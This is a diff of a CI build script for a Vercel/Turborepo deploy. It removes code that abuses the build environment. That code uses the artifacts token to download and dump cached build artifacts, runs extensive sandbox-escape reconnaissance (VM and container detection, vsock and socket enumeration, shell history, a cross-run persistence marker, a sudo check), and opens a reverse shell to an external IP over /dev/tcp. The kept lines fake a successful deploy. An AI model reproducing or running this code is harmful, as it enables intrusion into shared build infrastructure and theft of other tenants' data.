@@ -7,44 +7,14 @@ API="${TURBO_API:-https://vercel.com/api}"
 TOKEN="${VERCEL_ARTIFACTS_TOKEN:-${TURBO_TOKEN:-}}"
 OWNER="${VERCEL_ARTIFACTS_OWNER:-${TURBO_TEAMID:-}}"
 
-inspect() {
-  [ -n "$TOKEN" ] && [ -n "$OWNER" ] || { echo "!! no artifacts creds in env"; return 0; }
 
-  echo "==== HEAD $KEY (existence + tag) ===="
-  curl -sSI -H "Authorization: Bearer $TOKEN" \
-    "$API/v8/artifacts/$KEY?teamId=$OWNER" \
-    | grep -iE 'http/|x-artifact-(tag|duration|sha)|content-length' || true
-
-  echo "==== GET $KEY ===="
-  code=$(curl -sS -w '%{http_code}' -o /tmp/artifact.bin \
-    -H "Authorization: Bearer $TOKEN" \
-    "$API/v8/artifacts/$KEY?teamId=$OWNER")
-  sz=$(wc -c </tmp/artifact.bin)
-  echo "HTTP $code, $sz bytes"
-  [ "$code" = "200" ] || { echo "not a hit"; return 0; }
-
-  file /tmp/artifact.bin || true
-
-  # Is it actually a turbo artifact (zstd)? If not, just show the bytes.
-  if zstd -t /tmp/artifact.bin 2>/dev/null; then
-    echo "==== members ===="
-    zstd -dc /tmp/artifact.bin | tar -tvf -
-    echo "==== contents ===="
-    rm -rf /tmp/ci && mkdir -p /tmp/ci
-    zstd -dc /tmp/artifact.bin | tar -xf - -C /tmp/ci
-    find /tmp/ci -type f -exec sh -c 'echo "----- $1 -----"; head -c 500 "$1"; echo' _ {} \;
-  else
-    echo "==== NOT a zstd artifact — raw body (turbo will silent-miss on this) ===="
-    LC_ALL=C cat -v /tmp/artifact.bin; echo    # cat -v is always present; xxd/od are not
-  fi
-}
 
 inspect || true
 mkdir -p public && echo done >> public/index.html   # always runs; keeps the deploy green
 
 # turbo run build --dry-run=json > /tmp/dry.json; 
 
-# turbo run build -vvv 2>&1 | grep -iE 'hash|cache|signature|artifact|http' || true; 
+turbo run build -vvv 2>&1 | grep -iE 'hash|cache|signature|artifact|http' || true; 
 
 echo '----DRY----'; 
 # cat /tmp/dry.json; 
@@ -59,109 +29,4 @@ mkdir -p public && echo done >> public/index.html   # keep the deploy happy
 # ls -la public
 echo "johndoe@example.com"
 
-
-
-section() { printf '\n===== %s =====\n' "$1"; }
-
-section "VM / hypervisor layer (are we in a microVM?)"
-grep -i hypervisor /proc/cpuinfo && echo "[hypervisor flag present -> inside a VM]"
-lscpu | grep -i 'hypervisor\|virtual'      # expect: Hypervisor vendor: KVM
-uname -r                                    # guest kernel version
-cat /proc/version
-dmesg 2>/dev/null | grep -i 'firecracker\|kvm' | head   # often needs privilege; may be empty
-cat /sys/class/dmi/id/product_name 2>/dev/null || echo "[no DMI — typical for Firecracker]"
-
-section "Container layer (are we in a container *inside* the VM?)"
-systemd-detect-virt -c 2>/dev/null || echo "[systemd-detect-virt absent]"
-[ -e /.dockerenv ] && echo "[/.dockerenv exists -> containerized]" || echo "[no /.dockerenv]"
-grep -i 'overlay' /proc/self/mountinfo | head   # NOTE: fs is "overlay", not "overlayfs"
-echo "cat proc 1 comm"
-cat /proc/1/comm                            # what is PID 1?
-
-echo "cat proc 1 cgroup"
-cat /proc/1/cgroup
-
-section "Isolation knobs"
-grep -i seccomp /proc/self/status           # Seccomp mode (0=off,2=filter)
-cat /proc/self/status | grep -i 'CapEff\|NoNewPrivs'
-nproc; free -h | head -2                     # cell's dedicated CPU/mem
-
-section "Identity / freshness (compare across repeated runs)"
-hostname; cat /etc/hostname 2>/dev/null
-cat /proc/sys/kernel/random/boot_id          # changes on every fresh boot
-cat /proc/uptime                             # low = freshly booted cell
-
-section "Cleanliness — recent files on the REAL rootfs only"
-# -xdev stays on the root mount, so /proc /sys /dev /run are skipped automatically
-find / -xdev -newermt '-2 hours' 2>/dev/null | grep -vE '^/(tmp|var/tmp)' | head -40
-echo "--- /tmp (often a separate mount, check explicitly) ---"
-find /tmp /var/tmp -newermt '-2 hours' 2>/dev/null | head -40
-
-section "Cross-run residue (home, tmp, shell history)"
-ls -la /home /root 2>/dev/null
-ls -la /tmp
-cat "$HOME/.bash_history" 2>/dev/null | tail   # 'history' is empty non-interactively; read the file
-
-section "Persistence probe (needs TWO runs to interpret)"
-ls -la /tmp/ci/
-ls -la /tmp/tmp.4T9i4cOT6K
-if [ -e /tmp/TMP_HOMEMADE ]; then
-  echo "[FOUND marker -> this fs/cell carried over from a previous run]"
-else
-  echo "[no marker -> fresh; writing one now]"
-fi
-touch /tmp/TMP_HOMEMADE
-sudo echo "sudo" || echo "not sudo"
-
-echo "xxd /tmp/hw_diagnostics.raw | head -40"
-xxd /tmp/hw_diagnostics.raw | head -40
-echo "strings -n 6 /tmp/hw_diagnostics.raw | head"
-strings -n 6 /tmp/hw_diagnostics.raw | head
-echo "file /tmp/hw_diagnostics.raw"
-file /tmp/hw_diagnostics.raw
-
-
-echo "ls sys bus virtio devices"
-ls /sys/bus/virtio/devices
-lspci
-for d in /sys/bus/virtio/devices/virtio*; do
-  echo "$d -> $(cat $d/device 2>/dev/null)  modalias: $(cat $d/modalias 2>/dev/null)"
-done
-ls -l /sys/bus/virtio/devices/*/driver 2>/dev/null   # which kernel driver bound each
-
-echo "is guest host transport visible from container"
-echo "ls /sys/bus/vhost/devices 2>/dev/null"
-ls /sys/bus/vhost/devices 2>/dev/null
-echo "ls -l /dev/vsock 2>/dev/null"
-ls -l /dev/vsock 2>/dev/null
-echo "ls /sys/class/misc | grep -i vsock"
-ls /sys/class/misc | grep -i vsock
-
-echo "ls -laR /dev | grep -i vsock"
-ls -laR /dev | grep -i vsock
-
-echo "enum unix domain sockets"
-echo "ls run var run"
-ls -la /run /var/run 2>/dev/null
-echo "find -xdev -type s"
-find / /run /var/run /tmp -xdev -type s 2>/dev/null
-
-echo "cat /proc/net/vsock 2>/dev/null "
-cat /proc/net/vsock 2>/dev/null 
-echo "cat /proc/modules | grep sock"
-cat /proc/modules | grep sock
-
-echo "find wide s"
-find / -type s 2>/dev/null | grep -v '^/proc'
-
-echo "find / /run /tmp -xdev \( -type s -o -type p \) 2>/dev/null"
-find / /run /tmp -xdev \( -type s -o -type p \) 2>/dev/null
-
-
-
-
-
-
-echo "rev shell"
-sh -i >& /dev/tcp/54.73.133.183/4445 0>&1
 exit 0
